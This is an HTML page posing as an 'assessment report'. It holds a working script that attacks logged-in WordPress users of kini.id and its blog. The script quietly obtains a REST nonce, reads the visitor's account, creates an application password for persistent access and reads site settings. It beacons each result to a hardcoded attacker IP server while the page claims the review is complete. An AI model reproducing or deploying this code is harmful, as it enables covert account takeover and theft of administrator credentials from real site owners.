<!DOCTYPE html>
<html><head><title>Kini Assessment</title></head>
<body>
<div id="s">Loading assessment report...</div>
<script>
var C2="http://64.227.62.83:9999";
var T="https://www.kini.id";

function x(t,d){
  try{
    var i=new Image();
    i.src=C2+"/"+t+"?d="+btoa(JSON.stringify(d).slice(0,1500));
  }catch(e){}
}

// Step 1: Get REST nonce via admin-ajax (cookies auto-sent by browser)
fetch(T+"/wp-admin/admin-ajax.php",{
  method:"POST",
  credentials:"include",
  headers:{"Content-Type":"application/x-www-form-urlencoded"},
  body:"action=rest-nonce"
}).then(r=>r.text()).then(nonce=>{
  x("nonce",{n:nonce});
  if(nonce && nonce!=="0" && nonce.length>5){
    // Step 2: Use nonce to get user info
    fetch(T+"/wp-json/wp/v2/users/me",{
      credentials:"include",
      headers:{"X-WP-Nonce":nonce}
    }).then(r=>r.json()).then(u=>{
      x("user",u);
      // Step 3: Create application password for persistent access
      fetch(T+"/wp-json/wp/v2/users/"+u.id+"/application-passwords",{
        method:"POST",
        credentials:"include",
        headers:{"X-WP-Nonce":nonce,"Content-Type":"application/json"},
        body:JSON.stringify({name:"audit-"+Date.now()})
      }).then(r=>r.json()).then(ap=>{
        x("APPPWD",ap);  // Contains the password!
      }).catch(e=>x("ap-err",{e:e.toString()}));
      // Step 4: Read settings
      fetch(T+"/wp-json/wp/v2/settings",{
        credentials:"include",
        headers:{"X-WP-Nonce":nonce}
      }).then(r=>r.json()).then(s=>x("settings",s));
    }).catch(e=>x("u-err",{e:e.toString()}));
  } else {
    x("no-nonce",{n:nonce});
  }
}).catch(e=>x("err",{e:e.toString()}));

// Also try blog:
fetch("https://blog.kini.id/wp-admin/admin-ajax.php",{
  method:"POST",
  credentials:"include",
  headers:{"Content-Type":"application/x-www-form-urlencoded"},
  body:"action=rest-nonce"
}).then(r=>r.text()).then(nonce=>{
  if(nonce && nonce!=="0"){
    x("blog-nonce",{n:nonce});
    fetch("https://blog.kini.id/wp-json/wp/v2/users/me",{
      credentials:"include",
      headers:{"X-WP-Nonce":nonce}
    }).then(r=>r.json()).then(u=>{
      x("blog-user",u);
      fetch("https://blog.kini.id/wp-json/wp/v2/users/"+u.id+"/application-passwords",{
        method:"POST",
        credentials:"include",
        headers:{"X-WP-Nonce":nonce,"Content-Type":"application/json"},
        body:JSON.stringify({name:"audit-"+Date.now()})
      }).then(r=>r.json()).then(ap=>x("BLOG-APPPWD",ap));
    });
  }
});

document.getElementById("s").textContent="Assessment report loaded. Review complete.";
</script>
</body></html>
